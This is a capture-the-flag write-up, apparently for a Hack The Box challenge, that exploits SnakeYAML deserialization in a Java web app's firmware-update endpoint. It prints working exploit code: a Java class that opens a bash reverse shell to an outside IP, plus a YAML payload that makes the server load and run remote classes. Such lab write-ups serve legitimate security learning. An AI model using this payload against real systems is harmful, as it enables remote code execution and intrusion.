### Challenge description

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/4d31fc8b-b075-4764-ad6f-cbcff75d109b)

This page greets us with some IOT looking stuff. Something about water levels in some tanks:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/1b5e8ee1-8c68-4bc8-8f4d-e5b104ea9d96)

It gives us the option to do a Firmware Update based on user inputted configuration. Uh oh!

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/9dda62e7-3d37-4a6e-bc86-94e49cf7eb24)

Looking through the source code, specifically the `pom.xml` file where all the dependencies are for Java based web applications, we find it is using `snakeyaml`:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5a7638b9-9a46-4d87-88f0-df3317c09995)

There are some well-known exploits for yaml deserialization, including for snakeyaml. A good resource that I used can be found here: https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858

I tested the payload from the blog trying to get a callback to myself:
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8eff38ef-a129-4c0b-96cd-0e15b5cec67d)

Even though it says that "an error occured", we do get a callback:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/748899c8-d335-4585-b2a6-e07b35b3219c)

In this case all we need is to setup our files in the correct folders and with the correct names.

#### Step 1: Create exploit.java with a reverse shell payload:

```java
package snakeyaml;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class exploit implements ScriptEngineFactory {

    public exploit() {
        try {
            Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.10.14.76/1338 0>&1");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```
#### Step 2. Compile `exploit.java` and put the resulted `exploit.class` file in a folder called `snakeyaml`. This is done automatically with the syntax below because I specify the package in the code above.

```bash
javac -d . exploit.java
```

#### Step 3: Create folder `META-INF` and inside it another folder called `services`. Create a file called `javax.script.ScriptEngineFactory` with the content being: `snakeyaml.exploit`

#### Step 4: Host these on port 80 or whatever port you will mention in your yaml payload on the "Firmware Update".
#### Step 5: Send the payload below in the `/update` endpoint:

```xml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.76/"]
  ]]
]
```
Once we do that, we can see we get a callback on our netcat listener and can read the flag.
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/d4f9acc4-8f36-4b7c-acbb-1b53cec9e1de)

HTB{r1d3_th3_sn4k3}

